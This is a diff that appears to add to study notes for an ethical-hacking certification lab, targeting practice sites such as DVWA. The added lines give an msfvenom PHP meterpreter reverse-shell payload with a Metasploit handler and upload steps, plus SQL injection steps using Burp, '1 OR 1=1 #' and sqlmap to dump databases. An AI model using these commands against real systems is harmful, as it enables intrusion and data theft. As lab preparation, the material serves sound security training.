@@ -13,6 +13,17 @@ whatweb http://www.abc.com
 ```bash
 dirb http://training.cehorg.com -X .txt
 http://training.cehorg.com/Flag.txt
+
+or
+scan the target with Zapp to find the vulnerability. Then exploit it
+If it is file upload or file inclusion
+msfconsole -> msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1  LPORT=4444 -f raw >exploit.php
+>use exploit/multi/handler or use 30
+>set payload php/meterpreter/reverse_tcp
+Set LHOST ipadd
+Upload a file you created as exploit.php
+Open terminal and type run once you get url type url in brower you get meterpreter session then type ls 
+get the files. 
 ```
 #### Given website and folder C:\Wamp64\www\DVWA\ECweb\Certified\” 
 ```bash
@@ -77,6 +88,14 @@ ip && id
 
 try
 sqlmap -u "http://www.cehorg.com/page.php?page_id=84" --dbs
+
+or
+-> nmap -sV --script=http-enum <target>
+-> Find any input parameter on website and capture the request in burp and then use it to perform sql 
+injection using sqlmap. 
+-? Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT” 
+you get some value on burp copy that and create the txt file.(1 OR 1=1 #) 
+-> sqlmap -r <txt file from burpsuite> --dbs  
 ```
 
 #### IDOR
